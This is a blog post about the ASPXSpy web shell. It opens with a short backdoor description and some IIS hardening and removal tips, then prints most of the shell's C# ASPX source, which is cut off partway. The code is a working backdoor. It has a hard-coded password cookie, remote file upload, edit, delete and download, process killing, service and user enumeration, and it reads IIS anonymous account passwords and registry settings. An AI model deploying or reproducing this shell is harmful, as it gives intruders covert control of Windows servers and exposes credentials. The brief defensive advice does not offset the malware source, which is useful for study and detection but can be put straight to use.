---
id: 385
title: ASPXSpy shell script
author: admin
layout: post
guid: http://hackingscripts.com/?p=385
permalink: /aspxspy-shell-script/
categories:
  - ASPX
tags:
  - ASPX
---
The ASPXSpy script is a script written in ASPX, believe it or not, and allows the user to gain control of a compromised Windows server. Using this script, the hacker can use a web browser to upload files to the server and execute them.

This is the summary from Microsoft Malware Center:

> This threat is classified as a Trojan &#8211; Backdoor.  
> A backdoor trojan provides remote, usually surreptitious, access to affected systems.
> 
> A backdoor trojan may be used to conduct distributed denial of service (DDoS) attacks, or it may be used to install additional trojans or other forms of malicious software. For example, a backdoor trojan may be used to install a downloader or dropper trojan, which may in turn install a proxy trojan used to relay spam or a keylogger trojan which monitors and sends keystrokes to remote attackers.A backdoor Trojan may also open ports on the affected system and thus potentially lead to further compromise by other attackers. This threat is detected by the Microsoft antivirus engine. Technical details are not currently available. 

This script is fairly old now (it seems to have been released in 2009) and the vulnerability it exploited ([token kidnapping][1]) has been patched in the more recent versions of Windows (Windows Server 2003 and 2008 were affected by the exploit). So if your Windows software is up to date, you should have no problems with this script.

If your IIS server has been infected, do the following to remove the infection:

  1. Download and install the most recent version of Microsoft Security Essentials from Microsoft Security and update it with the latest definitions.
  2. Do a scan of IIS Server folders and IIS Server system files
  3. Remove any infected files found by the program

There is a StackOverflow Q & A on this topic [here][2].  
TL;DR &#8211; Put a web.config file containing the following code into the upload directory:

<pre>&lt;configuration>
    &lt;system.web>
      &lt;authorization>
        &lt;deny users="*" />
      &lt;/authorization>
    &lt;/system.web>
&lt;/configuration></pre>

To help prevent getting Trojans or having server security problems, install the latest patches/updates and check MS Technet for latest security information. You can also install and setup Urlscan from IIS Net Download Center, which may help prevent some types of attacks.

If you run Microsoft Security Essentials as part of IIS Server maintenance you can detect and remove threats before they have a chance to cause problems.

## ASPXSpy Script Source Code

<pre class="brush: jscript; title: ; notranslate" title="">&lt;%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%&gt;
&lt;%@ import Namespace="System.IO"%&gt;
&lt;%@ import Namespace="System.Diagnostics"%&gt;
&lt;%@ import Namespace="System.Data"%&gt;
&lt;%@ import Namespace="System.Management"%&gt;
&lt;%@ import Namespace="System.Data.OleDb"%&gt;
&lt;%@ import Namespace="Microsoft.Win32"%&gt;
&lt;%@ import Namespace="System.Net.Sockets" %&gt;
&lt;%@ import Namespace="System.Net" %&gt;
&lt;%@ import Namespace="System.Runtime.InteropServices"%&gt;
&lt;%@ import Namespace="System.DirectoryServices"%&gt;
&lt;%@ import Namespace="System.ServiceProcess"%&gt;
&lt;%@ import Namespace="System.Text.RegularExpressions"%&gt;
&lt;%@ Import Namespace="System.Threading"%&gt;
&lt;%@ Import Namespace="System.Data.SqlClient"%&gt;
&lt;%@ import Namespace="Microsoft.VisualBasic"%&gt;
&lt;%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;
&lt;%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;
&lt;%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;
&lt;%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%&gt;
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;script runat="server"&gt;
/*
Thanks Snailsor,FuYu,BloodSword,Cnqing,
Code by Bin
Make in China
Blog: http://alikaptanoglu.blogspot.com
E-mail : ali_kaptanoglu@hotmail.com
*/
public string Password="21232f297a57a5a743894a0e4a801fc3";//admin
public string vbhLn="ASPXSpy";
public int TdgGU=1;
protected OleDbConnection Dtdr=new OleDbConnection();
protected OleDbCommand Kkvb=new OleDbCommand();
public NetworkStream NS=null;
public NetworkStream NS1=null;
TcpClient tcp=new TcpClient();
TcpClient zvxm=new TcpClient();
ArrayList IVc=new ArrayList();
protected void Page_load(object sender,EventArgs e)
{
YFcNP(this);
fhAEn();
if (!pdo())
{
return;
}
if(IsPostBack)
{
string tkI=Request["__EVENTTARGET"];
string VqV=Request["__File"];
if(tkI!="")
{
switch(tkI)
{
case "Bin_Parent":
krIR(Ebgw(VqV));
break;
case "Bin_Listdir":
krIR(Ebgw(VqV));
break;
case "kRXgt":
kRXgt(Ebgw(VqV));
break;
case "Bin_Createfile":
gLKc(VqV);
break;
case "Bin_Editfile":
gLKc(VqV);
break;
case "Bin_Createdir":
stNPw(VqV);
break;
case "cYAl":
cYAl(VqV);
break;
case "ksGR":
ksGR(Ebgw(VqV));
break;
case "SJv":
SJv(VqV);
break;
case "Bin_Regread":
tpRQ(Ebgw(VqV));
break;
case "hae":
hae();
break;
case "urJG":
urJG(VqV);
break;
}
if(tkI.StartsWith("dAJTD"))
{
dAJTD(Ebgw(tkI.Replace("dAJTD","")),VqV);
}
else if(tkI.StartsWith("Tlvz"))
{
Tlvz(Ebgw(tkI.Replace("Tlvz","")),VqV);
}
else if(tkI.StartsWith("Bin_CFile"))
{
YByN(Ebgw(tkI.Replace("Bin_CFile","")),VqV);
}
}
}
else
{
PBZw();
}
}
public bool pdo()
{
if(Request.Cookies[vbhLn]==null)
{
tZSx();
return false;
}
else
{
if (Request.Cookies[vbhLn].Value != Password)
{
tZSx();
return false;
}
else
{
return true;
}
}
}
public void tZSx()
{
ljtzC.Visible=true;
ZVS.Visible=false;
}
protected void YKpI(object sender,EventArgs e)
{
Session.Abandon();
Response.Cookies.Add(new HttpCookie(vbhLn,null));
tZSx();
}
public void PBZw()
{
ZVS.Visible=true;
ljtzC.Visible=false;
Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";
Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";
Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};";
Bin_Span_Sname.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")";
Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();
if (AXSbb.Value==string.Empty)
{
AXSbb.Value=OElM(Server.MapPath("."));
}
Bin_H2_Title.InnerText="File Manager &gt;&gt;";
krIR(AXSbb.Value);
}
public void fhAEn()
{
try
{
string[] YRgt=Directory.GetLogicalDrives();
for(int i=0;i&lt;YRgt.Length;i++)
{
Control c=ParseControl(" &lt;asp:LinkButton Text='"+mFvj(YRgt[i])+"' ID=\"Bin_Button_Driv"+i+"\" runat='server' commandargument= '"+YRgt[i]+"'/&gt; | ");
Bin_Span_Drv.Controls.Add(c);
LinkButton nxeDR=(LinkButton)Page.FindControl("Bin_Button_Driv"+i);
nxeDR.Command+=new CommandEventHandler(this.iVk);
}
}catch(Exception ex){}
}
public string OElM(string path)
{
if(path.Substring(path.Length-1,1)!=@"\")
{
path=path+@"\";
}
return path;
}
public string nrrx(string path)
{
char[] trim={'\\'};
if(path.Substring(path.Length-1,1)==@"\")
{
path=path.TrimEnd(trim);
}
return path;
}
[DllImport("kernel32.dll",EntryPoint="GetDriveTypeA")]
public static extern int OMZP(string nDrive);
public string mFvj(string instr)
{
string EuXD=string.Empty;
int num=OMZP(instr);
switch(num)
{
case 1:
EuXD="Unknow("+instr+")";
break;
case 2:
EuXD="Removable("+instr+")";
break;
case 3:
EuXD="Fixed("+instr+")";
break;
case 4:
EuXD="Network("+instr+")";
break;
case 5:
EuXD="CDRom("+instr+")";
break;
case 6:
EuXD="RAM Disk("+instr+")";
break;
}
return EuXD.Replace(@"\","");
}
public string MVVJ(string instr)
{
byte[] tmp=Encoding.Default.GetBytes(instr);
return Convert.ToBase64String(tmp);
}
public string Ebgw(string instr)
{
byte[] tmp=Convert.FromBase64String(instr);
return Encoding.Default.GetString(tmp);
}
public void krIR(string path)
{
WICxe();
CzfO.Visible=true;
Bin_H2_Title.InnerText="File Manager &gt;&gt;";
AXSbb.Value=OElM(path);
DirectoryInfo GQMM=new DirectoryInfo(path);
if(Directory.GetParent(nrrx(path))!=null)
{
string bg=OKM();
TableRow p=new TableRow();
for(int i=1;i&lt;6;i++)
{
TableCell pc=new TableCell();
if(i==1)
{
pc.Width=Unit.Parse("2%");
pc.Text="0";
p.CssClass=bg;
}
if(i==2)
{
pc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Parent','"+MVVJ(Directory.GetParent(nrrx(path)).ToString())+"')\"&gt;Parent Directory&lt;/a&gt;";
}
p.Cells.Add(pc);
UGzP.Rows.Add(p);
}
}
try
{
int vLlH=0;
foreach(DirectoryInfo Bin_folder in GQMM.GetDirectories())
{
string bg=OKM();
vLlH++;
TableRow tr=new TableRow();
TableCell tc=new TableCell();
tc.Width=Unit.Parse("2%");
tc.Text="0";
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tr.Cells.Add(tc);
TableCell HczyN=new TableCell();
HczyN.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')\"&gt;"+Bin_folder.Name+"&lt;/a&gt;";
tr.Cells.Add(HczyN);
TableCell LYZK=new TableCell();
LYZK.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
tr.Cells.Add(LYZK);
UGzP.Rows.Add(tr);
TableCell ERUL=new TableCell();
ERUL.Text="--";
tr.Cells.Add(ERUL);
UGzP.Rows.Add(tr);
TableCell ZGKh=new TableCell();
ZGKh.Text="&lt;a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\"&gt;Del&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \"&gt;Rename&lt;/a&gt;";
tr.Cells.Add(ZGKh);
UGzP.Rows.Add(tr);
}
TableRow cKVA=new TableRow();
cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
cKVA.Attributes["bgcolor"]="#dddddd";
TableCell JlmW=new TableCell();
JlmW.Attributes["colspan"]="6" ;
JlmW.Attributes["height"]="5";
cKVA.Cells.Add(JlmW);
UGzP.Rows.Add(cKVA);
int aYRwo=0;
foreach(FileInfo Bin_Files in GQMM.GetFiles())
{
aYRwo++;
string gb=OKM();
TableRow tr=new TableRow();
TableCell tc=new TableCell();
tc.Width=Unit.Parse("2%");
tc.Text="&lt;input type=\"checkbox\" value=\"0\" name=\""+MVVJ(Bin_Files.Name)+"\"&gt;";
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=gb;
tr.Attributes["onmouseout"]="this.className='"+gb+"';";
tr.Cells.Add(tc);
TableCell filename=new TableCell();
if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))
{
string url=Request.Url.ToString();
filename.Text="&lt;a href=\""+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\"&gt;"+Bin_Files.Name+"&lt;/a&gt;";
}
else
{
filename.Text=Bin_Files.Name;
}
TableCell albt=new TableCell();
albt.Text=Bin_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
TableCell YzK=new TableCell();
YzK.Text=mTG(Bin_Files.Length);
TableCell GLpi=new TableCell();
GLpi.Text="&lt;a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\"&gt;Down&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('Please input the new path(full path):','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \"&gt;Copy&lt;/a&gt; | &lt;a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\"&gt;Edit&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \"&gt;Rename&lt;/a&gt; | &lt;a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\"&gt;Time&lt;/a&gt; ";
tr.Cells.Add(filename);
tr.Cells.Add(albt);
tr.Cells.Add(YzK);
tr.Cells.Add(GLpi);
UGzP.Rows.Add(tr);
}
string lgb=OKM();
TableRow oWam=new TableRow();
oWam.CssClass=lgb;
for(int i=1;i&lt;4;i++)
{
TableCell lGV=new TableCell();
if(i==1)
{
lGV.Text="&lt;input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i&lt;ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/&gt;";
}
if(i==2)
{
lGV.Text="&lt;a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i&lt;ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('SJv',d_file)};}\"&gt;Delete selected&lt;/a&gt;";
}
if(i==3)
{
lGV.ColumnSpan=4;
lGV.Style.Add("text-align","right");
lGV.Text=vLlH+" directories/ "+aYRwo+" files";
}
oWam.Cells.Add(lGV);
}
UGzP.Rows.Add(oWam);
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public string OKM()
{
TdgGU++;
if(TdgGU % 2==0)
{
return "alt1";
}
else
{
return "alt2";
}
}
public void kRXgt(string qcKu)
{
try
{
Directory.Delete(qcKu,true);
xseuB("Directory delete new success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(Directory.GetParent(qcKu).ToString());
}
public void dAJTD(string sdir,string ddir)
{
try
{
Directory.Move(sdir,ddir);
xseuB("Directory Renamed Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void Tlvz(string sfile,string dfile)
{
try
{
File.Move(sfile,dfile);
xseuB("File Renamed Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void YByN(string spath,string dpath)
{
try
{
File.Copy(spath,dpath);
xseuB("File Copy Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void stNPw(string path)
{
try
{
Directory.CreateDirectory(AXSbb.Value+path);
xseuB("Directory created success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void gLKc(string path)
{
if(Request["__EVENTTARGET"]=="Bin_Editfile" || Request["__EVENTTARGET"]=="Bin_Createfile")
{
foreach(ListItem item in NdCX.Items)
{
if(item.Selected=true)
{
item.Selected=false;
}
}
}
Bin_H2_Title.InnerHtml="Create/ Edit File &gt;&gt;";
WICxe();
vrFA.Visible=true;
if(path.IndexOf(":")&lt; 0)
{
Sqon.Value=AXSbb.Value+path;
}
else
{
Sqon.Value=path;
}
if(File.Exists(Sqon.Value))
{
StreamReader sr;
if(NdCX.SelectedItem.Text=="UTF-8")
{
sr=new StreamReader(Sqon.Value,Encoding.UTF8);
}
else
{
sr=new StreamReader(Sqon.Value,Encoding.Default);
}
Xgvv.InnerText=sr.ReadToEnd();
sr.Close();
}
else
{
Xgvv.InnerText=string.Empty;
}
}
public void ksGR(string path)
{
FileInfo fs=new FileInfo(path);
Response.Clear();
Page.Response.ClearHeaders();
Page.Response.Buffer=false;
this.EnableViewState=false;
Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));
Response.AddHeader("Content-Length",fs.Length.ToString());
Page.Response.ContentType="application/unknown";
Response.WriteFile(fs.FullName);
Page.Response.Flush();
Page.Response.Close();
Response.End();
Page.Response.Clear();
}
public void SJv(string path)
{
try
{
string[] spdT=path.Split(',');
for(int i=0;i&lt;spdT.Length-1;i++)
{
File.Delete(AXSbb.Value+Ebgw(spdT[i]));
}
xseuB("File Delete Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void hae()
{
try
{
File.Delete(Request.PhysicalPath);
Response.Redirect("http://www.rootkit.net.cn");
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void cYAl(string path)
{
Bin_H2_Title.InnerHtml="Clone file was last modified time &gt;&gt;";
WICxe();
zRyG.Visible=true;
QiFB.Value=AXSbb.Value+path;
lICp.Value=AXSbb.Value;
pWVL.Value=AXSbb.Value+path;
string Att=File.GetAttributes(QiFB.Value).ToString();
if(Att.LastIndexOf("ReadOnly")!=-1)
{
ZhWSK.Checked=true;
}
if(Att.LastIndexOf("System")!=-1)
{
SsR.Checked=true;
}
if(Att.LastIndexOf("Hidden")!=-1)
{
ccB.Checked=true;
}
if(Att.LastIndexOf("Archive")!=-1)
{
fbyZ.Checked=true;
}
yUqx.Value=File.GetCreationTimeUtc(pWVL.Value).ToString();
uYjw.Value=File.GetLastWriteTimeUtc(pWVL.Value).ToString();
aLsn.Value=File.GetLastAccessTimeUtc(pWVL.Value).ToString();
}
public static String mTG(Int64 fileSize)
{
if(fileSize&lt;0)
{
throw new ArgumentOutOfRangeException("fileSize");
}
else if(fileSize &gt;= 1024 * 1024 * 1024)
{
return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
}
else if(fileSize &gt;= 1024 * 1024)
{
return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));
}
else if(fileSize &gt;= 1024)
{
return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);
}
else
{
return string.Format("{0} B",fileSize);
}
}
private bool SGde(string sSrc)
{
Regex reg=new Regex(@"^0|[0-9]*[1-9][0-9]*$");
if(reg.IsMatch(sSrc))
{
return true;
}
else
{
return false;
}
}
public void AdCx()
{
string qcKu=string.Empty;
string mWGEm="IIS://localhost/W3SVC";
GlI.Style.Add("word-break","break-all");
try
{
DirectoryEntry HHzcY=new DirectoryEntry(mWGEm);
int fmW=0;
foreach(DirectoryEntry child in HHzcY.Children)
{
if(SGde(child.Name.ToString()))
{
fmW++;
DirectoryEntry newdir=new DirectoryEntry(mWGEm+"/"+child.Name.ToString());
DirectoryEntry HlyU=newdir.Children.Find("root","IIsWebVirtualDir");
string bg=OKM();
TableRow TR=new TableRow();
TR.Attributes["onmouseover"]="this.className='focus';";
TR.CssClass=bg;
TR.Attributes["onmouseout"]="this.className='"+bg+"';";
TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();
for(int i=1;i&lt;6;i++)
{
try
{
TableCell tfit=new TableCell();
switch(i)
{case 1:
tfit.Text=fmW.ToString();
break;
case 2:
tfit.Text=HlyU.Properties["AnonymousUserName"].Value.ToString();
break;
case 3:
tfit.Text=HlyU.Properties["AnonymousUserPass"].Value.ToString();
break;
case 4:
StringBuilder sb=new StringBuilder();
PropertyValueCollection pc=child.Properties["ServerBindings"];
for (int j=0; j &lt; pc.Count; j++)
{
sb.Append(pc[j].ToString()+"&lt;br&gt;");
}
tfit.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
break;
case 5:
tfit.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(HlyU.Properties["Path"].Value.ToString())+"')\"&gt;"+HlyU.Properties["Path"].Value.ToString()+"&lt;/a&gt;";
break;
}
TR.Cells.Add(tfit);
}
catch (Exception ex)
{
xseuB(ex.Message);
continue;
}
}
GlI.Controls.Add(TR);
}
}
}
catch(Exception ex)
{
xseuB(ex.Message);
}
}
public ManagementObjectCollection PhQTd(string query)
{
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
return QS.Get();
}
public DataTable cCf(string query)
{
DataTable dt=new DataTable();
int i=0;
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
try
{
foreach(ManagementObject m in QS.Get())
{
DataRow dr=dt.NewRow();
PropertyDataCollection.PropertyDataEnumerator oEnum;
oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);
while(oEnum.MoveNext())
{
PropertyData DRU=(PropertyData)oEnum.Current;
if(dt.Columns.IndexOf(DRU.Name)==-1)
{
dt.Columns.Add(DRU.Name);
dt.Columns[dt.Columns.Count-1].DefaultValue="";
}
if(m[DRU.Name]!=null)
{
dr[DRU.Name]=m[DRU.Name].ToString();
}
else
{
dr[DRU.Name]=string.Empty;
}
}
dt.Rows.Add(dr);
}
}
catch(Exception error)
{
}
return dt;
}
public void YUw()
{
try
{
Bin_H2_Title.InnerText="Process &gt;&gt;";
WICxe();
DCbS.Visible=true;
int UEbTI=0;
Process[] p=Process.GetProcesses();
foreach(Process sp in p)
{
UEbTI++;
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int i=1;i&lt;7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=UEbTI.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=sp.Id.ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=sp.ProcessName.ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=sp.Threads.Count.ToString();
tr.Controls.Add(td);
}
if(i==5)
{
td.Text=sp.BasePriority.ToString();
tr.Controls.Add(td);
}
if(i==6)
{
td.Text="--";
tr.Controls.Add(td);
}
}
IjsL.Controls.Add(tr);
}
}
catch(Exception error)
{
AIz();
}
AIz();
}
public void AIz()
{
try
{
Bin_H2_Title.InnerText="Process &gt;&gt;";
WICxe();
DCbS.Visible=true;
int UEbTI=0;
DataTable dt=cCf("Win32_Process");
for(int j=0;j&lt;dt.Rows.Count;j++)
{
UEbTI++;
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int i=1;i&lt;7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=UEbTI.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=dt.Rows[j]["ProcessID"].ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=dt.Rows[j]["Name"].ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=dt.Rows[j]["ThreadCount"].ToString();
tr.Controls.Add(td);
}
if(i==5)
{
td.Text=dt.Rows[j]["Priority"].ToString();
tr.Controls.Add(td);
}
if(i==6)
{
if( dt.Rows[j]["CommandLine"]!=string.Empty)
{
td.Text="&lt;a href=\"javascript:Bin_PostBack('urJG','"+dt.Rows[j]["ProcessID"].ToString()+"')\"&gt;Kill&lt;/a&gt;";
}
else
{
td.Text="--";
}
tr.Controls.Add(td);
}
}
IjsL.Controls.Add(tr);
}
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void urJG(string pid)
{
try
{
foreach(ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='"+pid+"'"))
{
p.InvokeMethod("Terminate",null);
p.Dispose();
}
xseuB("Process Kill Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
AIz();
}
public void oHpF()
{
try
{
Bin_H2_Title.InnerText="Services &gt;&gt;";
WICxe();
iQxm.Visible=true;
int UEbTI=0;
ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();
for(int i=0;i&lt;kQmRu.Length;i++)
{
UEbTI++;
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int b=1;b&lt;7;b++)
{
TableCell td=new TableCell();
if(b==1)
{
td.Width=Unit.Parse("2%");
td.Text=UEbTI.ToString();
tr.Controls.Add(td);
}
if(b==2)
{
td.Text="null";
tr.Controls.Add(td);
}
if(b==3)
{
td.Text=kQmRu[i].ServiceName.ToString();
tr.Controls.Add(td);
}
if(b==4)
{
td.Text="";
tr.Controls.Add(td);
}
if(b==5)
{
string kOIo=kQmRu[i].Status.ToString();
if(kOIo=="Running")
{
td.Text="&lt;font color=green&gt;"+kOIo+"&lt;/font&gt;";
}
else
{
td.Text="&lt;font color=red&gt;"+kOIo+"&lt;/font&gt;";
}
tr.Controls.Add(td);
}
if(b==6)
{
td.Text="";
tr.Controls.Add(td);
}
}
vHCs.Controls.Add(tr);
}
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void tZRH()
{
try
{
Bin_H2_Title.InnerText="Services &gt;&gt;";
WICxe();
iQxm.Visible=true;
int UEbTI=0;
DataTable dt=cCf("Win32_Service");
for(int j=0;j&lt;dt.Rows.Count;j++)
{
UEbTI++;
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
for(int i=1;i&lt;7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=UEbTI.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=dt.Rows[j]["ProcessID"].ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=dt.Rows[j]["Name"].ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=dt.Rows[j]["PathName"].ToString();
tr.Controls.Add(td);
}
if(i==5)
{
string kOIo=dt.Rows[j]["State"].ToString();
if(kOIo=="Running")
{
td.Text="&lt;font color=green&gt;"+kOIo+"&lt;/font&gt;";
}
else
{
td.Text="&lt;font color=red&gt;"+kOIo+"&lt;/font&gt;";
}
tr.Controls.Add(td);
}
if(i==6)
{
td.Text=dt.Rows[j]["StartMode"].ToString();
tr.Controls.Add(td);
}
}
vHCs.Controls.Add(tr);
}
}
catch(Exception error)
{
oHpF();
}
}
public void PLd()
{
try
{
WICxe();
xWVQ.Visible=true;
Bin_H2_Title.InnerText="User Information &gt;&gt;";
DirectoryEntry TWQ=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());
foreach(DirectoryEntry child in TWQ.Children)
{
foreach(string name in child.Properties.PropertyNames)
{
PropertyValueCollection pvc=child.Properties[name];
int c=pvc.Count;
for(int i=0;i&lt;c;i++)
{
if(name!="objectSid" && name!="Parameters" && name!="LoginHours")
{
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
TableCell td=new TableCell();
td.Text=name;
tr.Controls.Add(td);
TableCell td1=new TableCell();
td1.Text=pvc[i].ToString();
tr.Controls.Add(td1);
VPa.Controls.Add(tr);
}
}
}
TableRow trn=new TableRow();
for(int x=1;x&lt;3;x++)
{
TableCell tdn=new TableCell();
tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
trn.Controls.Add(tdn);
VPa.Controls.Add(trn);
}
}
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void iLVUT()
{
try
{
WICxe();
xWVQ.Visible=true;
Bin_H2_Title.InnerText="User Information &gt;&gt;";
DataTable user=cCf("Win32_UserAccount");
for(int i=0;i&lt;user.Rows.Count;i++)
{
for(int j=0;j&lt;user.Columns.Count;j++)
{
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
TableCell td=new TableCell();
td.Text=user.Columns[j].ToString();
tr.Controls.Add(td);
TableCell td1=new TableCell();
td1.Text=user.Rows[i][j].ToString();
tr.Controls.Add(td1);
VPa.Controls.Add(tr);
}
TableRow trn=new TableRow();
for(int x=1;x&lt;3;x++)
{
TableCell tdn=new TableCell();
tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
trn.Controls.Add(tdn);
VPa.Controls.Add(trn);
}
}
}
catch(Exception error)
{
PLd();
}
}
public void pDVM()
{
try
{
RegistryKey EeZ=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
string IKjwH=DdmPl(EeZ,"PortNumber");
RegistryKey izN=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");
int cpu=izN.SubKeyCount;
RegistryKey mQII=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor&#92;&#48;\");
string NPPZ=DdmPl(mQII,"ProcessorNameString");
WICxe();
ghaB.Visible=true;
Bin_H2_Title.InnerText="System Information &gt;&gt;";
Bin_H2_Mac.InnerText="MAC Information &gt;&gt;";
